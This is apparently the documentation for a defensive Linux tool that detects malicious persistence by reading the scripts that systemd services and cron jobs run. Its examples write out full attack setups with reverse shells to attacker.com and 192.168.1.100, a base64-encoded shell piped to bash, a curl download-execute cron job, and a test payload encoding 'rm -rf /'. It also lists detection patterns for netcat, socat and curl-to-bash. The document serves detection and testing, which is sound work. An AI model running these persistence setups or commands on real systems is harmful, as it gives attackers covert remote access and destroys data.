# Script Content Analysis (v1.5.0)

## Overview

Persistnux v1.5.0 introduces **deep script content analysis** - the ability to read and analyze the actual contents of script files executed by persistence mechanisms. This feature catches sophisticated attacks that hide malicious code inside seemingly innocent scripts.

## Why Script Content Analysis?

### The Problem

Attackers often disguise malicious persistence using innocent-looking file paths:

```systemd
# Systemd service: /etc/systemd/system/update-checker.service
[Service]
ExecStart=/usr/local/bin/update-checker.sh
```

**Previous behavior (v1.4.0 and earlier)**:
- Persistnux would check: "Is `/usr/local/bin/update-checker.sh` a safe path?"
- Answer: Unknown path, not package-managed → MEDIUM confidence
- Would NOT look inside the script to see what it actually does

**Attacker's script content**:
```bash
#!/bin/bash
# update-checker.sh - looks innocent from the outside

# Malicious reverse shell hidden inside
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### The Solution

**New behavior (v1.5.0)**:
- Persistnux detects that `/usr/local/bin/update-checker.sh` is a script
- Reads the script content (first 1000 lines)
- Analyzes content for dangerous patterns
- Finds: `bash -i` and `/dev/tcp/` → **Upgrades to HIGH confidence**
- Result: Malicious script detected even though the ExecStart looked innocent

## How It Works

### Detection Flow

```
┌─────────────────────────────────────┐
│ Systemd Service or Cron Job Found  │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│ Extract command/ExecStart           │
│ Example: /usr/local/bin/backup.sh  │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│ Is the file a script?               │
│ (check file type + shebang)         │
└─────────────┬───────────────────────┘
              │
              ├─ NO (binary/ELF) → Skip analysis
              │
              └─ YES (script) ↓
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Read script content           │
              │ (first 1000 lines)            │
              └───────────────┬───────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Check for suspicious patterns │
              │ - NEVER_WHITELIST_PATTERNS    │
              │ - Script-specific patterns    │
              └───────────────┬───────────────┘
                              │
                              ├─ CLEAN → Keep original confidence
                              │
                              └─ SUSPICIOUS → Upgrade to HIGH confidence
```

### Two New Functions

#### 1. `is_script(file_path)`

**Purpose**: Determine if a file is a script (text) or binary (ELF)

**Logic**:
1. Check if file exists and is readable
2. Use `file` command to check file type
3. Look for indicators: "shell script", "python script", "perl script", "text executable"
4. Fallback: Check for shebang (`#!/bin/bash`, etc.) in first line

**Returns**:
- 0 = Script file
- 1 = Not a script (binary, doesn't exist, not readable)

**Example**:
```bash
if is_script "/usr/local/bin/backup.sh"; then
    echo "It's a script, analyze it!"
fi
```

#### 2. `analyze_script_content(script_file)`

**Purpose**: Read script content and detect malicious patterns

**Logic**:
1. Read first 1000 lines of script (prevents huge file DoS)
2. Check against `NEVER_WHITELIST_PATTERNS` (shared with command validation)
3. Check against script-specific suspicious patterns
4. Return 0 if suspicious, 1 if clean

**Returns**:
- 0 = Suspicious content found
- 1 = Clean / No suspicious patterns

**Example**:
```bash
if analyze_script_content "/usr/local/bin/backup.sh"; then
    confidence="HIGH"
    log_finding "Script contains suspicious content!"
fi
```

## Suspicious Patterns Detected

### From NEVER_WHITELIST_PATTERNS

These patterns are dangerous in both ExecStart commands AND script content:

- `/dev/tcp/` - TCP reverse shell
- `/dev/udp/` - UDP reverse shell
- `bash -i` - Interactive bash (common in reverse shells)
- `sh -i` - Interactive sh
- `nc -e` - Netcat with execute flag
- `| nc` - Piping to netcat
- `| bash` - Piping to bash
- `curl.*|.*bash` - Download-execute pattern
- `wget.*|.*bash` - Download-execute pattern
- `curl.*|.*sh` - Download-execute pattern
- `base64.*-d.*|.*bash` - Decode and execute

### Script-Specific Patterns (New in v1.5.0)

Additional patterns that are suspicious in script files:

| Pattern | Description | Example |
|---------|-------------|---------|
| `eval.*\$` | Eval with variables (obfuscation) | `eval $encoded_command` |
| `exec.*\$` | Exec with variables | `exec $payload` |
| `\$\(curl` | Command substitution with curl | `$(curl http://evil.com/pay.sh)` |
| `\$\(wget` | Command substitution with wget | `$(wget -O- http://evil.com)` |
| `base64.*-d` | Base64 decode (obfuscation) | `echo $data \| base64 -d` |
| `openssl.*enc.*-d` | Decrypt payload | `openssl enc -aes-256-cbc -d` |
| `mkfifo` | Named pipes (reverse shells) | `mkfifo /tmp/f` |
| `nc.*-l.*-p` | Netcat listener | `nc -l -p 4444` |
| `socat.*TCP` | Socat TCP connections | `socat TCP:evil.com:443` |
| `python.*-c` | Python one-liner | `python -c 'import os;os.system(...)'` |
| `perl.*-e` | Perl one-liner | `perl -e 'system(...)'` |
| `ruby.*-e` | Ruby one-liner | `ruby -e 'system(...)'` |
| `awk.*system` | AWK system calls | `awk 'BEGIN{system("...")}'` |
| `/proc/self/exe` | Self-execution tricks | `cp /proc/self/exe /tmp/backdoor` |
| `chmod.*\+x.*tmp` | Making temp files executable | `chmod +x /tmp/payload.sh` |
| `chmod.*777` | Overly permissive permissions | `chmod 777 /tmp/backdoor` |

## Integration Points

### Systemd Services

**Location**: `persistnux.sh` lines 704-716

**Integration**:
```bash
# After initial confidence checks, before package manager check
local executable=$(get_executable_from_command "$exec_start")
if [[ -n "$executable" ]] && [[ -f "$executable" ]]; then
    if is_script "$executable"; then
        if analyze_script_content "$executable"; then
            # Script contains suspicious content - upgrade to HIGH
            confidence="HIGH"
            log_finding "Systemd service executes script with suspicious content: $service_file -> $executable"
        fi
    fi
fi
```

**Effect**:
- Analyzes scripts referenced in ExecStart
- Upgrades confidence to HIGH if malicious content found
- Runs BEFORE package manager check (so HIGH confidence isn't downgraded)

### Cron Jobs (File-Based)

**Location**: `persistnux.sh` lines 756-769

**Integration**:
```bash
# After initial pattern checks
if is_script "$cron_path"; then
    if analyze_script_content "$cron_path"; then
        confidence="HIGH"
        log_finding "Cron file contains suspicious script content: $cron_path"
    fi
fi
```

**Effect**:
- Analyzes cron configuration files that are scripts
- Example: `/etc/cron.daily/backup` (often scripts without .sh extension)

### Cron Jobs (Directory-Based)

**Location**: `persistnux.sh` lines 791-799

**Integration**:
```bash
# After initial checks, before package manager check
if is_script "$cron_file"; then
    if analyze_script_content "$cron_file"; then
        confidence="HIGH"
        log_finding "Cron job script contains suspicious content: $cron_file"
    fi
fi
```

**Effect**:
- Analyzes individual cron scripts in directories like `/etc/cron.d/`

## Real-World Attack Examples

### Example 1: Obfuscated Systemd Persistence

**Attack Setup**:
```bash
# Create systemd service
cat > /etc/systemd/system/system-monitor.service << 'EOF'
[Unit]
Description=System Performance Monitor

[Service]
ExecStart=/opt/monitor/check.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Create malicious script with obfuscation
cat > /opt/monitor/check.sh << 'EOF'
#!/bin/bash
# System monitoring script

payload="YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ=="
echo $payload | base64 -d | bash
EOF

chmod +x /opt/monitor/check.sh
systemctl enable system-monitor.service
```

**Decoded payload**:
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

**Detection**:
- **v1.4 and earlier**: MEDIUM confidence (unmanaged service, unknown path)
- **v1.5 with script analysis**: HIGH confidence
  - Detects: `base64 -d` pattern
  - Detects: `| bash` pattern
  - Log: "Systemd service executes script with suspicious content"

### Example 2: Cron Job with Download-Execute

**Attack Setup**:
```bash
# Create cron job
cat > /etc/cron.d/apt-daily << 'EOF'
0 * * * * root /usr/local/sbin/apt-check
EOF

# Create script that downloads and executes
cat > /usr/local/sbin/apt-check << 'EOF'
#!/bin/sh
# APT package check

$(curl -s http://192.168.1.100:8080/payload.sh)
EOF

chmod +x /usr/local/sbin/apt-check
```

**Detection**:
- **v1.4 and earlier**: MEDIUM confidence (cron job, unmanaged)
- **v1.5 with script analysis**: HIGH confidence
  - Detects: `$(curl` pattern (command substitution)
  - Log: "Cron job script contains suspicious content"

### Example 3: Named Pipe Reverse Shell

**Attack Setup**:
```bash
cat > /etc/cron.daily/backup << 'EOF'
#!/bin/bash
# Daily backup routine

# Create named pipe and reverse shell
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
rm /tmp/f
EOF

chmod +x /etc/cron.daily/backup
```

**Detection**:
- **v1.4 and earlier**: MEDIUM confidence (cron.daily script)
- **v1.5 with script analysis**: HIGH confidence
  - Detects: `mkfifo` pattern
  - Detects: `bash -i` pattern
  - Detects: `| nc` pattern
  - Log: "Cron file contains suspicious script content"

## Performance Considerations

### File Size Limit

Scripts are analyzed up to 1000 lines to prevent performance issues:

```bash
local script_content=$(head -n 1000 "$script_file" 2>/dev/null)
```

**Rationale**:
- Most malicious code appears in first few lines
- Prevents DoS from reading huge log files or data files
- 1000 lines ≈ 50KB for typical scripts

### Conditional Analysis

Scripts are only analyzed if:
1. File exists and is readable
2. `is_script()` returns true (text file with shebang)
3. File is referenced by a persistence mechanism

**Not analyzed**:
- Binary executables (ELF files)
- Files that don't exist
- Files without read permissions

## Limitations

### 1. Heavily Obfuscated Code

Advanced obfuscation may bypass pattern matching:

```bash
# May not be detected if variable names are randomized
a="bash"
b="-i"
c=">&"
d="/dev/tcp/evil.com/4444"
$a $b $c $d
```

**Mitigation**: Keep updating `suspicious_script_patterns` array based on observed attacks

### 2. Encrypted Payloads

If the entire script is encrypted and decrypted at runtime:

```bash
#!/bin/bash
openssl enc -aes-256-cbc -d -in /tmp/payload.enc -k secretkey | bash
```

**Detection**: Still caught by `openssl.*enc.*-d` pattern

### 3. Split Persistence

Malicious code split across multiple files:

```bash
# Cron script: /etc/cron.d/task
# Executes: /opt/script1.sh
# Which sources: /opt/script2.sh (contains malicious code)
```

**Current limitation**: Only analyzes the first script, not sourced files

**Future enhancement**: Could recursively follow `source` and `.` commands

## Testing

### Test 1: Benign Script

```bash
cat > /tmp/safe_script.sh << 'EOF'
#!/bin/bash
echo "System uptime:"
uptime
df -h
EOF

# Should return 1 (clean)
analyze_script_content /tmp/safe_script.sh
echo $?  # Output: 1
```

### Test 2: Reverse Shell Script

```bash
cat > /tmp/malicious.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
EOF

# Should return 0 (suspicious)
analyze_script_content /tmp/malicious.sh
echo $?  # Output: 0
```

### Test 3: Obfuscated Script

```bash
cat > /tmp/obfuscated.sh << 'EOF'
#!/bin/bash
payload="cm0gLXJmIC8="
echo $payload | base64 -d | bash
EOF

# Should return 0 (suspicious - base64 -d detected)
analyze_script_content /tmp/obfuscated.sh
echo $?  # Output: 0
```

## Best Practices for Analysts

### 1. Review HIGH Confidence Scripts

Scripts flagged with HIGH confidence should be manually reviewed:

```bash
# In CSV output, filter by:
# - confidence = HIGH
# - category = "Systemd Service" or "Cron"
# - Look at the "command" column to see the script path
```

### 2. Examine Script Content

Use the file path from the finding to read the actual script:

```bash
# If finding shows: /opt/backup/daily.sh
cat /opt/backup/daily.sh

# Or for better analysis
less /opt/backup/daily.sh
```

### 3. Check for Obfuscation Layers

If script uses base64/encryption, decode it manually:

```bash
# If script contains: echo "YmFzaC..." | base64 -d
echo "YmFzaC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xMDAvNDQ0NCAwPiYx" | base64 -d
# Output: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

### 4. Correlate with Network Activity

Check if suspicious IPs/domains from scripts match network logs:

```bash
# Extract IPs from malicious scripts
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' /path/to/script.sh

# Check netstat for active connections
netstat -antp | grep <IP>
```

## Comparison with v1.4.0

| Aspect | v1.4.0 | v1.5.0 |
|--------|--------|--------|
| **ExecStart Analysis** | Only checks command line | Reads and analyzes script content |
| **Obfuscation Detection** | Limited (only ExecStart patterns) | Advanced (base64, encryption, eval) |
| **Reverse Shell Detection** | Detects obvious patterns | Detects mkfifo, socat, named pipes |
| **One-liner Detection** | No | Yes (python -c, perl -e, etc.) |
| **False Negatives** | Higher (misses hidden malicious code) | Lower (catches code inside scripts) |
| **Performance Impact** | Minimal | Slight increase (reads 1000 lines per script) |

## Summary

**What changed**: Persistnux now reads and analyzes the actual content of script files, not just the command that executes them.

**Why it matters**: Attackers hide malicious code inside innocent-looking scripts. This feature detects those hidden threats.

**How to use it**: No configuration needed - runs automatically on all detected systemd services and cron jobs.

**What to watch for**: HIGH confidence findings with "script contains suspicious content" in the description.

**Next steps for analysts**:
1. Review HIGH confidence script findings
2. Manually inspect flagged scripts
3. Decode any obfuscation (base64, etc.)
4. Correlate with network/process activity
